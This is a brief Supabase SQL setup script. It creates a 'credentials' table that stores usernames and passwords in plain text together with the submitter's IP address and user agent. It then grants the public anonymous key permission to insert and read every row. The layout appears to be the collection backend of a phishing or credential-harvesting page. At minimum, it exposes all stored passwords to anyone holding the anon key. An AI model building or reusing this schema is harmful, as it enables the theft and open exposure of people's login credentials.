-- Run this in Supabase SQL Editor (Dashboard → SQL Editor → New Query)

CREATE TABLE IF NOT EXISTS credentials (
  id BIGSERIAL PRIMARY KEY,
  username TEXT NOT NULL,
  password TEXT NOT NULL,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Allow the anon key to insert and read
ALTER TABLE credentials ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow anonymous inserts"
  ON credentials FOR INSERT
  WITH CHECK (true);

CREATE POLICY "Allow anonymous select"
  ON credentials FOR SELECT
  USING (true);
